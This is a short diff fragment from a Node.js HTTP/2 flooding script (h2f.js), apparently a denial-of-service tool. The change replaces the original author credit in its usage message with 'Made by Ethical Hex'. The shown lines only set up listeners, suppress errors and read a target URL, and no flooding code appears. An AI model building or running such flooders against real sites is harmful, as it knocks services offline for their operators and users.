@@ -8,7 +8,7 @@ const crypto = require('crypto');
 require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
 
 process.setMaxListeners(0);
-process.on('uncaughtException', function (e) { console.error('h/2 flooder by @iotb3r7\nUsage: node h2f.js [url] [time] [worker (1-6)] [proxylist]',); });
+process.on('uncaughtException', function (e) { console.error('Made by Ethical Hex\nUsage: node h2f.js [url] [time] [worker (1-6)] [proxylist]',); });
 process.on('unhandledRejection', function (e) { console.error('[ERROR]', e.message); });
 
 var target = process.argv[2];
